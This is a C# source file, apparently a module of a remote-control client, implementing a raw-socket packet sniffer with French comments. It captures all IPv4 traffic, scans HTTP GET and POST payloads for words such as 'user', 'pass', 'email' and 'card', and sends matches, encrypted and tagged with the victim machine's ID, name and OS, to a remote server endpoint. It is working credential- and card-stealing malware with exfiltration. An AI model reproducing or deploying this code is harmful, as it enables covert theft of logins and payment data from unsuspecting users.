using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
using System.Windows.Forms;

namespace ClIENT_PC.Controller
{
    class SniffeurController : ControllerBase
    {
        // Définition des protocoles dans une Entete IP
        private enum PacketProtocole
        {
            ICMP = 1,
            IGMP = 2,
            TCP = 6,
            UDP = 17
        }
        private struct EnteteIP
        {
            //RFC 791
            // Version                       |
            public byte Version;
            //Internet Header Lenght 4 bits : x * 32 bits | (1 octet)
            public byte IHL;
            // 1 octet
            public byte TypeOfService;
            // = longueur entete + données  (2 octets)
            public int LongeurTotale;
            // 2 octets 
            public int Identification;
            // 3 bits
            public byte Flag;
            // 13 et que font le 2 bits manquants ???? 
            public byte FragmentOffset;
            //1 octet 
            public byte TTL;
            // 1 octet
            public PacketProtocole Protocole;
            // 2 octets
            public int CheckSum;
            // 4 octets
            public string IPSource;
            // 4 octets
            public string IPDest;
            // 1 octet
            public byte OptionType;

        }
        private struct EnteteUDP
        {
            // RFC 768

            // 2 octets
            public int PortSource;
            //2 octets
            public int PortDest;
            // 2 octets
            public int Longueur;
            // 2 octets
            public int CheckSum;

        }
        private struct EnteteTCP
        {
            //RFC 793

            // 2 octets
            public int PortSource;
            //2 octets
            public int PortDest;
            // 4 octets ( numéro du packet)
            public long NumSeq;
            // 4 octets ( packet suivant attendu)
            public long NumACK;
            // 4 bits = longueur du header (à multiplier par 32 bits)
            public byte Offset;
            //   6 bits        
            public byte Flags;
            // 2 octets
            public int Fenetre;
            // 2 octets
            public int CheckSum;
            // 2 octets
            public int PtrDonneesURG;

        }
        private struct EnteteICMP
        {
            // rfc 792

            public byte Type;
            // 0 / 0 = reponse au ping
            public byte Code;
            // 2 octets
            public int Checksum;
            // 2 octets
            public int Identifiant;
            // 2 octets
            public int NumeroSequence;

        }
        private struct EnteteIGMP
        {
            //v2  rfc 2236

            // 1 octet
            public byte Type;
            // 1 octet
            public byte TempsReponse;
            // 2 octets
            public int Checksum;
            // 4 octets
            public string AdresseGroupe;

        }

        private EnteteIP mEnteteIP;
        private EnteteUDP mEnteteUDP;
        private EnteteTCP mEnteteTCP;
        private EnteteICMP mEnteteICMP;
        private EnteteIGMP mEnteteIGMP;
        private byte[] Datas = new byte[-1 + 1];
        public void Start()
        {
            // we are only listening to IPv4 interfaces
            var IPv4Addresses = Dns.GetHostEntry(Dns.GetHostName()).AddressList.Where(al => al.AddressFamily == AddressFamily.InterNetwork).AsEnumerable();
            foreach (IPAddress ip in IPv4Addresses)
            {
                Console.WriteLine("IP: " + ip);
                Sniff(ip);
            }
            // wait until a key is pressed
        }

        public void Init(byte[] Buffer)
        {
            // On va initialiser les entetes IP et suivantes en fonction du Buffer reçu
            mEnteteIP.Version = Convert.ToByte((Buffer[0] & 0xf0) / 16);
            mEnteteIP.IHL = Convert.ToByte(Buffer[0] & 0xf);
            mEnteteIP.TypeOfService = Buffer[1];
            mEnteteIP.LongeurTotale = Buffer[2] * 256 + Buffer[3];
            mEnteteIP.Identification = Buffer[4] * 256 + Buffer[5];
            mEnteteIP.Flag = Convert.ToByte(Buffer[6] & 0xe0 / 32);
            //11100000 -> 00000111
            mEnteteIP.FragmentOffset = Convert.ToByte((Buffer[6] & 0x1f) * 256 + Buffer[7] / 4);
            // decalage de 2 bits à droite 
            mEnteteIP.TTL = Buffer[8];
            mEnteteIP.Protocole = (PacketProtocole)Buffer[9];
            mEnteteIP.CheckSum = Buffer[10] * 256 + Buffer[11];
            mEnteteIP.IPSource = Buffer[12].ToString() + "." + Buffer[13].ToString() + "." + Buffer[14].ToString() + "." + Buffer[15].ToString();
            mEnteteIP.IPDest = Buffer[16].ToString() + "." + Buffer[17].ToString() + "." + Buffer[18].ToString() + "." + Buffer[19].ToString();

            int PtrDebut = mEnteteIP.IHL * 4;
            // 32 bits
            switch (mEnteteIP.Protocole.ToString())
            {
                case "IGMP":
                    mEnteteIGMP.Type = Buffer[PtrDebut];
                    mEnteteIGMP.TempsReponse = Buffer[PtrDebut + 1];
                    mEnteteIGMP.Checksum = Buffer[PtrDebut + 2] * 256 + Buffer[PtrDebut + 3];
                    mEnteteIGMP.AdresseGroupe = Buffer[PtrDebut + 4].ToString() + "." + Buffer[PtrDebut + 5].ToString() + "." + Buffer[PtrDebut + 6].ToString() + "." + Buffer[PtrDebut + 7].ToString();
                    break;
                case "ICMP":
                    mEnteteICMP.Type = Buffer[PtrDebut];
                    mEnteteICMP.Code = Buffer[PtrDebut + 1];
                    mEnteteICMP.Checksum = Buffer[PtrDebut + 2] * 256 + Buffer[PtrDebut + 3];
                    mEnteteICMP.Identifiant = Buffer[PtrDebut + 4] * 256 + Buffer[PtrDebut + 5];
                    mEnteteICMP.NumeroSequence = Buffer[PtrDebut + 6] * 256 + Buffer[PtrDebut + 7];
                    Datas = new byte[Buffer.Length - PtrDebut - 8 - 1];
                    for (int i = 0; i <= Datas.Length - 1; i++)
                    {
                        Datas[i] = Buffer[PtrDebut + 8 + i];
                    }
                    break;
                case "UDP":
                    mEnteteUDP.PortSource = Buffer[PtrDebut] * 256 + Buffer[PtrDebut + 1];
                    mEnteteUDP.PortDest = Buffer[PtrDebut + 2] * 256 + Buffer[PtrDebut + 3];
                    mEnteteUDP.Longueur = Buffer[PtrDebut + 4] * 256 + Buffer[PtrDebut + 5];
                    mEnteteUDP.CheckSum = Buffer[PtrDebut + 6] * 256 + Buffer[PtrDebut + 7];
                    // a vérifier
                    Datas = new byte[mEnteteUDP.Longueur - 8];
                    for (int i = 0; i <= Datas.Length - 1; i++)
                    {
                        Datas[i] = Buffer[PtrDebut + 8 + i];
                    }
                    break;
                case "TCP":
                    mEnteteTCP.PortSource = Buffer[PtrDebut] * 256 + Buffer[PtrDebut + 1];
                    mEnteteTCP.PortDest = Buffer[PtrDebut + 2] * 256 + Buffer[PtrDebut + 3];
                    mEnteteTCP.NumSeq = Convert.ToInt64(Buffer[PtrDebut + 4] * (Math.Pow(2, 24)) + Buffer[PtrDebut + 5] * (Math.Pow(2, 16)) + Buffer[PtrDebut + 6] * (Math.Pow(2, 8)) + Buffer[PtrDebut + 7]);
                    mEnteteTCP.NumACK = Convert.ToInt64(Buffer[PtrDebut + 8] * (Math.Pow(2, 24)) + Buffer[PtrDebut + 9] * (Math.Pow(2, 16)) + Buffer[PtrDebut + 10] * (Math.Pow(2, 8)) + Buffer[PtrDebut + 11]);
                    mEnteteTCP.Offset = Convert.ToByte(Buffer[PtrDebut + 12] & 0xf0 / 16);
                    mEnteteTCP.Flags = Convert.ToByte(Buffer[PtrDebut + 13] & 0x3f);
                    mEnteteTCP.Fenetre = Buffer[PtrDebut + 14] * 256 + Buffer[PtrDebut + 15];
                    mEnteteTCP.CheckSum = Buffer[PtrDebut + 16] * 256 + Buffer[PtrDebut + 17];
                    mEnteteTCP.PtrDonneesURG = Buffer[PtrDebut + 18] * 256 + Buffer[PtrDebut + 19];

                    int DebutDatas = PtrDebut + (mEnteteTCP.Offset * 4);
                    if (Buffer.Length - 1 > DebutDatas)
                    {
                        Datas = new byte[Buffer.Length - 2 - DebutDatas + 1];
                        for (int i = 0; i <= Buffer.Length - 2 - DebutDatas; i++)
                        {
                            Datas[i] = Buffer[DebutDatas + i];
                        }
                    }
                    break;
            }

        }
        public void Sniff(IPAddress ip)
        {
            byte[] OptionIn = BitConverter.GetBytes(1);//new byte[4] { 1, 0, 0, 0 }
            // setup the socket to listen on, we are listening just to IPv4 IPAddresses
            Socket sck = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
            sck.Bind(new IPEndPoint(ip, 0));
            sck.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
            sck.IOControl(IOControlCode.ReceiveAll, OptionIn, null);

            //byte array to hold the packet data we want to examine.
            //  we are assuming default (20byte) IP header size + 4 bytes for TCP header to get ports
            byte[] buffer = new byte[65536];

            // Async methods for recieving and processing data
            Action<IAsyncResult> OnReceive = null;
            OnReceive = (ar) =>
            {
                string protocole = ToProtocolString(buffer.Skip(9).First());

                Init(buffer);
                string data = Encoding.ASCII.GetString(GetDatas());
                data = Regex.Replace(data, @"[^\u0009^\u000A^\u000D^\u0020-\u007E]", string.Empty);
                //data = decode(Encoding.ASCII.GetBytes(data));
                if ((data.Contains("POST") || data.Contains("GET")) && checkInteresant(data))
                {
                    string host = GetHostName(IP_Dest());
                    string content =
                        "IP Source:" + IP_Source() + Environment.NewLine +
                        "IP Destination:" + IP_Dest() + Environment.NewLine +
                        "Port Destination:" + GetPortDest() + Environment.NewLine +
                        "IP Version:" + IP_Version() + Environment.NewLine +
                        "Protocole:" + protocole + Environment.NewLine +

                        Environment.NewLine + Environment.NewLine +
                        "Donnée:" + Environment.NewLine + data;
                    Send(host, content);
                }
                buffer = new byte[65536]; //clean out our buffer
                sck.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(OnReceive), null);
            };
            // begin listening to the socket
            sck.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None,
            new AsyncCallback(OnReceive), null);
        }

        private bool checkInteresant(string data)
        {
            string[] words = 
            { 
                "user", 
                "pass",
                "email",
                "card",
            };
            foreach (var item in words)
            {
                if (data.Contains(item))
                {
                    return true;
                }
            }
            return false;
        }
        private void Send(string host, string content)
        {
            InfosPcController gi = new InfosPcController();
            string dCrypt = serializer.Serialize(new
            {
                guid = gi.getUqGuid(),
                name = Environment.MachineName,
                os = gi.getOs(),
                hooked_func = "Http Sniffer", 
                content = content
            });

            string donne = "d=" + HttpUtility.UrlEncode(Encryption.Encrypt(Parametre.encryptionKey, dCrypt));
            string reponse = hr.post(Router.url("post_snf"), donne);
            dynamic result = serializer.DeserializeObject(reponse);
            string json = Encryption.Decrypt(Parametre.encryptionKey, result["d"]);
            dynamic data = serializer.DeserializeObject(json);
        }
        public string GetHostName(string ipAddress)
        {
            try
            {
                IPHostEntry entry = Dns.GetHostEntry(ipAddress);
                if (entry != null)
                {
                    return entry.HostName;
                }
            }
            catch
            {
                return "N/A";
            }
            return "N/A";
        }
        /*private string decode(byte[] Datas)
        {
            if (Datas.Length == 0)
            {
                return "Pas de données pour ce paquet.";
            }
            string StrHex = "";
            string StrAscii = "";
            string Output = "";
            for (int i = 0; i <= Datas.Length - 1; i++)
            {
                StrHex += MyHex(Datas[i], 2) + " ";
                if (Datas[i] >= 32)
                {
                    StrAscii += Convert.ToChar(Datas[i]);
                }
                else
                {
                    StrAscii += ".";
                }

                if (StrAscii.Length == 16)
                {
                    Output += StrHex + new string(' ', 4) + StrAscii;
                    StrAscii = "";
                    StrHex = "";
                }
            }
            if (!string.IsNullOrEmpty(StrAscii))
                Output += StrHex + new string(' ', 4 + (16 - StrAscii.Length) * 3) + StrAscii;

            return Output;
        }
        private int IDFromHex(string HexID)
        {
            return int.Parse(HexID, System.Globalization.NumberStyles.HexNumber);
        }
        private string MyHex(long NbDec, int Lg)
        {
            string Hx = new string('0', Lg) + IDFromHex(NbDec.ToString());
            Hx = Hx.Substring(Hx.Length - Lg, Lg);
            return Hx;

        }*/
        public static string ShowDialog(string caption, string text)
        {
            Form prompt = new Form();
            prompt.Width = 900;
            prompt.Height = 850;
            prompt.FormBorderStyle = FormBorderStyle.FixedDialog;
            prompt.Text = caption;
            prompt.StartPosition = FormStartPosition.CenterScreen;
            Label textLabel = new Label() { Left = 50, Top = 20, Text = caption };
            TextBox textBox = new TextBox() { Left = 50, Top = 50, Width = 600, Height = 600, Multiline = true, Text = text };
            Button confirmation = new Button() { Text = "Ok", Left = 350, Width = 100, Top = 70, DialogResult = DialogResult.OK };
            confirmation.Click += (sender, e) => { prompt.Close(); };
            prompt.Controls.Add(textBox);
            prompt.Controls.Add(confirmation);
            prompt.Controls.Add(textLabel);
            prompt.AcceptButton = confirmation;

            return prompt.ShowDialog() == DialogResult.OK ? textBox.Text : "";
        }

        public string ToProtocolString(byte b)
        {
            switch (b)
            {
                case 1: return "ICMP";
                case 2: return "IGMP";
                case 6: return "TCP";
                case 17: return "UDP";
                default: return "#" + b.ToString();
            }
        }
        public string IP_Source()
        {
            return mEnteteIP.IPSource;
        }
        public string IP_Dest()
        {
            return mEnteteIP.IPDest;
        }
        public byte[] GetDatas()
        {
            return Datas;
        }
        public string GetPortSource()
        {
            string StrPort = null;
            switch (mEnteteIP.Protocole.ToString())
            {
                case "UDP":
                    StrPort = mEnteteUDP.PortSource.ToString();
                    break;
                case "TCP":
                    StrPort = mEnteteTCP.PortSource.ToString();
                    break;
                default:
                    StrPort = "N/A";
                    break;
            }
            return StrPort;
        }
        public string GetPortDest()
        {
            string StrPort = null;
            switch (mEnteteIP.Protocole.ToString())
            {
                case "UDP":
                    StrPort = mEnteteUDP.PortDest.ToString();
                    break;
                case "TCP":
                    StrPort = mEnteteTCP.PortDest.ToString();
                    break;
                default:
                    StrPort = "N/A";
                    break;
            }
            return StrPort;
        }
        public string IP_Version()
        {
            return Convert.ToString(mEnteteIP.Version);
        }
    }
}
